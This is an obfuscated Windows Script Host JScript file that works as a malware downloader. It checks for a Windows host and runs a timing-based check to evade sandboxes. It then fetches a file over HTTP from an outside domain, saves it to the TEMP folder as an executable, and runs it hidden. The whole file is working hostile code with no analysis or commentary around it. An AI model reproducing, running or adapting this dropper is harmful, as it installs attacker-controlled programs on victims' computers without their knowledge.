var WP = false;
var M = "CreateObject";
var U = function L() {return WScript[M]("WScript.Shell");}(), jS = 11;
var A = "MSXML2.XMLHTTP";
var n0 = 2123213;
var oq = 0;
function N(sD){U["Run"](sD, oq, oq);};
function B(){return "" + A;};
function Ch(VR, W){oq = oq * 1; return VR - W;};
function eC(){return M;};
/*@cc_on
  @if (@_win32 || @_win64)
    WP = true;
  @end
@*/
if (WP)
{
var iV = "";
function O(){return 22;};
var x = 0; var us = 0;
function p()
{
var e = new this["Date"]();
var Kt = e["getUTCMilliseconds"]();
WScript["Sleep"](O());
var e = new this["Date"]();
var Q = e["getUTCMilliseconds"]();
WScript["Sleep"](O());
var e = new this["Date"]();
var Ys = e["getUTCMilliseconds"]();
var x = "d";
x = Ch(Q, Kt);
var us = "l";
us = Ch(Ys, Q);
iV = "open";
return Ch(x, us);
}
var D = false;
var a = false;
for (var o = oq; o < O() * 1; o++){if (p() != oq){
D = true; 
us = "31" + 11 * x + us; 
a = true; 
break;
}}
function n() {return ((D == true) && (D == a)) ? 1 : oq;};
if (D && n() && a){
function P() {return U["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "283pveAka6.exe";};
 V = B();
 CD = WScript[M](V);
 var ao = 1;
 while (ao){
try {
CD[iV]("GET", "http://www.the2ndedit.com/j1oisa", false);
CD["send"]();
K = "Sleep";
for (;;){WScript[K](O() * 11); if (CD["readystate"] >= 2 * 2) break;};
ao = oq;
} catch(HV){};
}
function pw(ah) {var F = (1, 2, 3, 4, 5, ah); return F;};
g = WScript[eC()]("ADODB.Stream");
V = g;
V[iV]();
V["type"] = pw(1);
V["write"](CD["ResponseBody"]);
g["position"] = pw(oq);
V["Save" + "ToFile"](P(), 2);
g["c"+"lose"]();
i = P();
N(i);
}
}

